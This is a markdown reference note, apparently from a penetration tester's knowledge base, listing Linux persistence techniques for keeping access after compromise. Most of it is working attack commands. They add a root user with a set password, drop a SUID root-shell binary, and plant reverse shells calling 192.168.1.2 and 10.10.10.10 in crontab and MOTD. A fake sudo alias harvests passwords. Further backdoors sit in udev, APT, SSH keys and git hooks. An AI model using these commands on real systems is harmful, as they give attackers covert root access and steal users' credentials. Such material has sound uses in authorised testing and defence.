---
title: "Linux Persistence Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - reference-note
  - linux
  - persistence
  - backdoor
  - cron
  - ssh
---

# Linux Persistence Reference

Techniques for maintaining access on Linux systems after initial compromise.

Related: [[Linux-Privilege-Escalation-Reference]] | [[GTFObins-SUID-Quick-Reference]]

---

## Basic Reverse Shell Listeners

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

---

## Add a Root User

```bash
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
```

---

## SUID Binary

Drop a setuid binary that spawns a root shell.

```bash
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

---

## Crontab Reverse Shell

Add a reverse shell that fires on reboot.

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

---

## Backdoor User's .bashrc / .zshrc

Fake sudo alias that captures passwords (FR/EN version):

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2
```

Alternative: fake sudo script approach.

```bash
chmod u+x ~/.hidden/fakesudo
echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

Create the `fakesudo` script:

```bash
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```

---

## Backdoor a Startup Service

Edit `/etc/network/if-up.d/upstart`:

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

---

## Backdoor Message of the Day (MOTD)

Edit `/etc/update-motd.d/00-header`:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
```

---

## Backdoor User Startup File (Desktop)

Create a `.desktop` autostart entry:

```
~/.config/autostart/NAME_OF_FILE.desktop
```

```ini
[Desktop Entry]
Type=Application
Name=Welcome
Exec=/var/lib/gnome-welcome-tour
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
OnlyShowIn=GNOME;
X-GNOME-Autostart-enabled=false
```

---

## Backdoor a Driver (udev)

Trigger a payload when a USB device is connected:

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

---

## Backdoor APT

If you can write to `/etc/apt/apt.conf.d/`, your command executes on every `apt-get update`:

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

---

## Backdoor SSH

Add an SSH key to gain passwordless access.

```bash
# 1. Generate key pair
ssh-keygen

# 2. Add public key to authorized_keys
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# 3. Set correct permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

---

## Backdoor Git

Backdoor git configs and hooks — no root required.

### Git Config Variables

`core.editor` - executes when git needs an editor (`git rebase -i`, `git commit --amend`):

```properties
[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}
```

`core.pager` - executes when git displays large output (`git diff`, `git log`, `git show`):

```properties
[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}
```

`core.sshCommand` - executes when interacting with remote SSH repos (`git fetch`, `git pull`, `git push`):

```properties
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

Note: `ssh.variant` is optional but prevents double execution.

### Git Hooks

Hooks in `.git/hooks/` run when their name matches the git action. Must be executable (`chmod +x`).

Useful hooks to backdoor:
- `pre-commit` - runs just before `git commit`
- `pre-push` - runs just before `git push`
- `post-checkout` - runs just after `git checkout`
- `post-merge` - runs after `git merge` / `git pull`

Globally backdoor all git hooks via user-level config (`~/.gitconfig`):

```properties
[core]
hooksPath = /path/to/backdoor/hooks
```

Note: This will break any existing repository-specific git hooks.

---

## Additional Persistence Techniques (MITRE ATT&CK)

- [SSH Authorized Keys - T1098.004](https://attack.mitre.org/techniques/T1098/004)
- [Create or Modify System Process: Systemd Service - T1543.002](https://attack.mitre.org/techniques/T1543/002/)
- [Event Triggered Execution: .bash_profile and .bashrc - T1546.004](https://attack.mitre.org/techniques/T1546/004/)
- [Event Triggered Execution: Trap - T1546.005](https://attack.mitre.org/techniques/T1546/005/)
- [Hijack Execution Flow: LD_PRELOAD - T1574.006](https://attack.mitre.org/techniques/T1574/006/)
- [Scheduled Task/Job: Cron - T1053.003](https://attack.mitre.org/techniques/T1053/003/)
- [Server Software Component: Web Shell - T1505.003](https://attack.mitre.org/techniques/T1505/003/)
- [Pre-OS Boot: Bootkit - T1542.003](https://attack.mitre.org/techniques/T1542/003/)
- [Traffic Signaling: Port Knocking - T1205.001](https://attack.mitre.org/techniques/T1205/001/)

---

## References

- [turbochaos - Linux Rootkits 101](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
- [Jakob Lell - Hacking Contest Rootkit](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
- [GNOME - Got root? Pwning a machine](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
